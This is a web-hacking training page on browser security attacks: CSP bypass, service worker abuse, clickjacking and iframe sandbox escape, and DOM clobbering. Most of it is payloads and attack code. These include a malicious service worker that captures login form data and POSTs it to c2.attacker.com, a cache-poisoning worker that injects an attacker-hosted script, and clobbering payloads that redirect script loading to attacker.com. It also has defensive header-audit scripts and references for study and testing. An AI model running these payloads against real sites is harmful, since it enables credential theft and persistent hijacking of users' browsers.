---
layout: training-page
title: "Browser Security Attacks — CSP Bypass, Service Workers & DOM Clobbering"
module: "Web Hacking"
tags:
  - csp
  - service-worker
  - dom-clobbering
  - iframe
  - browser-security
  - xss
  - clickjacking
  - sandbox-escape
page_key: "web-browser-security-attacks"
render_with_liquid: false
---

# Browser Security Attacks — CSP Bypass, Service Workers & DOM Clobbering

Browser security mechanisms (CSP, CORS, sandboxing, service workers) are often misconfigured or exploitable. This page covers four attack categories: Content Security Policy bypass techniques, service worker abuse for persistence and cache poisoning, iframe-based attacks, and DOM clobbering for bypassing client-side security controls.

---

## Content Security Policy (CSP) Bypass

### Weak CSP Directives

```
# Test CSP strength — CSP Evaluator:
curl -s -I https://target.com | grep -i "content-security-policy"

# Most common bypassable CSP patterns:

# 1. Wildcard sources:
# Content-Security-Policy: script-src 'self' *.googleapis.com *.gstatic.com
# Bypass: load script from attacker-controlled subdomain under googleapis.com?
# Not directly — but find JSONP endpoints on allowed domains

# 2. JSONP on allowlisted CDNs:
# Content-Security-Policy: script-src 'self' www.google.com
# Bypass via JSONP:
# <script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)//"></script>

# 3. Angular template injection (when angular.js is in script-src):
# Content-Security-Policy: script-src 'self' ajax.googleapis.com
# If site loads AngularJS from googleapis:
# <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

# 4. data: URI (older browsers / misconfigured):
# Content-Security-Policy: script-src 'self' data:
# Bypass: <script src="data:text/javascript,alert(1)"></script>

# 5. Unsafe-inline bypass via nonce leak:
# Content-Security-Policy: script-src 'nonce-RANDOM_VALUE'
# If nonce is predictable, static, or reflected in response body:
curl -s https://target.com | grep "nonce-"
# Forge: <script nonce="FOUND_NONCE">alert(1)</script>
```

### CSP Bypass via Trusted Domains

```
# Find JSONP endpoints on trusted domains:
# Common CDNs with JSONP:
# - google.com/complete/search?jsonp=CALLBACK
# - facebook.com/plugins/comments/firehose?jsonp=CALLBACK (deprecated)
# - Any API that takes a callback= parameter

# Google Analytics universal bypass (when analytics.js allowed):
# Some CSP policies allow google-analytics.com for tracking
# gtag.js doesn't provide JSONP, but:
# Find API endpoints on allowed origins that accept callback parameter:
curl "https://allowlisted-domain.com/api/data?callback=alert(1)" 

# angular.js CSP bypass (when version < 1.6 loaded):
<div ng-app>{{$on.constructor('alert(1)')()}}</div>

# Find script gadgets on page to bypass 'self' restricted CSP:
# Script gadgets: existing scripts that eval/innerHTML attacker content
# Search for: innerHTML, eval, document.write, setTimeout(string)
grep -r "innerHTML\|eval\|document\.write" site_js/

# CSP via base-uri injection:
# If base-uri not set in CSP:
# <base href="https://attacker.com/">
# Relative URLs in the page (../img/logo.png) now load from attacker
```

---

## Service Worker Abuse

### Registering a Malicious Service Worker

Service workers run persistently in the browser background, can intercept all network requests, and survive page reloads. Registering one via XSS creates persistent control.

```javascript
// Via XSS: register attacker-controlled service worker
// Requires: XSS on target origin + service worker URL on same origin (or CDN with CORS)

// Injection payload (via XSS):
navigator.serviceWorker.register('/uploads/evil.js')
  .then(reg => console.log("SW registered:", reg.scope))
  .catch(err => console.log("SW failed:", err));

// For this to work:
// 1. Service worker file must be on same origin
// 2. OR: site has an open upload endpoint that serves JS files

// Find uploadable JS vectors:
// - File upload endpoints that don't enforce MIME type
// - Cache poisoning to serve malicious JS from CDN
// - Error pages that reflect user content as text/javascript

// evil.js — persistent credential interceptor:
self.addEventListener('fetch', event => {
  const url = event.request.url;
  // Intercept login form submissions:
  if (url.includes('/login') || url.includes('/signin')) {
    event.respondWith(
      fetch(event.request.clone()).then(response => {
        return response;
      })
    );
    // Clone and exfil the request body:
    event.request.clone().formData().then(data => {
      fetch('https://c2.attacker.com/harvest', {
        method: 'POST',
        body: JSON.stringify(Object.fromEntries(data))
      });
    });
  }
});
```

### Service Worker Cache Poisoning

```javascript
// Cache all pages with malicious script injection:
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open('v1').then(cache => {
      // Cache poisoned versions of critical pages
      return fetch('/').then(response => {
        // Inject script into cached HTML response
        return response.text().then(body => {
          const poisoned = body.replace(
            '</head>',
            '<script src="https://attacker.com/hook.js"></script></head>'
          );
          cache.put('/', new Response(poisoned, {
            headers: response.headers
          }));
        });
      });
    })
  );
});

self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request).then(cached => {
      return cached || fetch(event.request);
    })
  );
});
// Victim will now always receive poisoned cached page
// Persists until: cache cleared, SW unregistered, or origin cleared
```

---

## Iframe-Based Attacks

### Clickjacking

```html
<!-- Test for clickjacking: -->
<iframe src="https://target.com/account/transfer" 
        style="opacity: 0.01; width:500px; height:500px; position:absolute; top:0; left:0;">
</iframe>
<!-- If iframe loads: X-Frame-Options not set, CSP frame-ancestors not set -->

<!-- Check headers: -->
curl -s -I https://target.com | grep -iE "x-frame-options|frame-ancestors"
```

```python
# Test script — identify clickjackable endpoints:
import requests

endpoints = ["/account/delete", "/settings/email", "/password/reset", "/transfer"]
headers = {}
for ep in endpoints:
    r = requests.get(f"https://target.com{ep}", headers={"Cookie": "session=VALID"})
    xfo = r.headers.get("X-Frame-Options", "MISSING")
    csp = r.headers.get("Content-Security-Policy", "")
    fa = "frame-ancestors" in csp
    print(f"{ep}: XFO={xfo}, frame-ancestors={fa}")
```

### Iframe Sandbox Escape

```html
<!-- Sandboxed iframes — what allow-scripts + allow-same-origin enables: -->
<iframe sandbox="allow-scripts allow-same-origin" src="/user-content">
</iframe>
<!-- If allow-same-origin is set WITH allow-scripts: iframe can remove its own sandbox -->

<!-- Escape: content in iframe can run: -->
<script>
// Remove sandbox by accessing parent's iframe element (same-origin):
const iframe = parent.document.querySelector('iframe[sandbox]');
iframe.removeAttribute('sandbox');
// Now reloads without sandbox restrictions
</script>

<!-- The rule: sandbox="allow-scripts allow-same-origin" is effectively no sandbox -->
<!-- Test for this misconfiguration when reviewing iframes embedding user content -->
```

---

## DOM Clobbering

DOM clobbering exploits the legacy behavior where HTML elements with `id` or `name` attributes create properties on the `window` and `document` objects. It's used to bypass client-side security checks.

### Basic DOM Clobbering

```html
<!-- When application code does:
     if (!window.config || !window.config.secure) { doSomethingDangerous(); }
     And the page renders user-supplied HTML in innerHTML: -->

<!-- Attacker injects: -->
<a id="config"><a id="config" name="secure" href="https://attacker.com">

<!-- window.config is now the first <a> element
     window.config.secure is the second <a> element (truthy HTMLElement)
     Security check passes! -->

<!-- Simple single-property clobber: -->
<img id="isAdmin">
<!-- window.isAdmin === HTMLImageElement → truthy → bypasses: if (!isAdmin) redirect() -->
```

### Advanced DOM Clobbering

```html
<!-- Clobber nested objects using form + input: -->
<!-- To clobber: window.x.y = "value" -->
<form id="x"><input id="y" value="attacker-controlled"></form>
<!-- window.x = <form>, window.x.y = <input>
     x.y.value === "attacker-controlled" -->

<!-- Clobber document.baseURI? -->
<base href="https://attacker.com">
<!-- document.baseURI is now attacker's domain
     Scripts that build URLs using document.baseURI will load from attacker -->

<!-- HTML sanitizer bypass using DOM clobbering: -->
<!-- Some sanitizers rely on browser APIs that can be clobbered: -->
<img id="nodeType" name="1">
<!-- If sanitizer checks: if (node.nodeType === 1) → now returns <img> truthy object -->
```

### DOM Clobbering for XSS Escalation

```html
<!-- Scenario: page has DOMPurify-sanitized HTML rendering, but also has:
     var script = document.createElement('script');
     script.src = window.cdnConfig || '/default.js'; -->

<!-- Clobber cdnConfig to point to attacker's script: -->
<a id="cdnConfig" href="https://attacker.com/evil.js">

<!-- Now: window.cdnConfig = <a> element
     <a>.toString() = href value = "https://attacker.com/evil.js"
     Script loads from attacker! -->

<!-- Finding DOM clobbering sinks in JavaScript:
     Search for patterns where window properties are used as URLs or code: -->
grep -r "window\.\|document\." app.js | grep "src\|href\|innerHTML\|eval\|setTimeout"
```

---

## Quick Reference: Browser Security Header Test

```bash
# Complete browser security header audit:
python3 << 'EOF'
import requests

url = "https://target.com"
r = requests.get(url)

headers_to_check = {
    "Content-Security-Policy": "CSP — restricts resource loading",
    "X-Frame-Options": "Clickjacking protection",
    "X-Content-Type-Options": "MIME sniffing prevention",
    "Strict-Transport-Security": "HSTS — force HTTPS",
    "Permissions-Policy": "Feature policy (camera, mic, geolocation)",
    "Cross-Origin-Opener-Policy": "COOP — Spectre mitigations",
    "Cross-Origin-Embedder-Policy": "COEP — required for SharedArrayBuffer",
    "Cross-Origin-Resource-Policy": "CORP — prevent cross-origin reads",
}

print(f"URL: {url}\n{'='*60}")
for header, description in headers_to_check.items():
    value = r.headers.get(header, "MISSING")
    status = "✓" if value != "MISSING" else "✗"
    print(f"{status} {header}: {value[:80]}")
EOF
```

---

## Tools

- **CSP Evaluator** — `csp-evaluator.withgoogle.com` — analyzes CSP for bypass potential
- **CSP Scanner** — `github.com/nicowillis/csp-evaluator` — automated CSP audit
- **Retire.js** — identifies JS libraries with known bypass gadgets
- **DOMPurify** — safe HTML sanitizer (defense) — `github.com/cure53/DOMPurify`
- **TJ CSP Bypass** — curated list of JSONP endpoints on common CDNs

---

## Resources

- PortSwigger CSP bypass — `portswigger.net/web-security/cross-site-scripting/content-security-policy`
- PortSwigger clickjacking — `portswigger.net/web-security/clickjacking`
- DOM clobbering deep dive — `portswigger.net/research/dom-clobbering-strikes-back`
- Service worker security — `w3c.github.io/ServiceWorker/#security-considerations`
- CSP Is Dead, Long Live CSP — `research.google.com/pubs/pub45542.html`
- Google script gadgets research — `github.com/google/security-research-pocs/tree/master/script-gadgets`
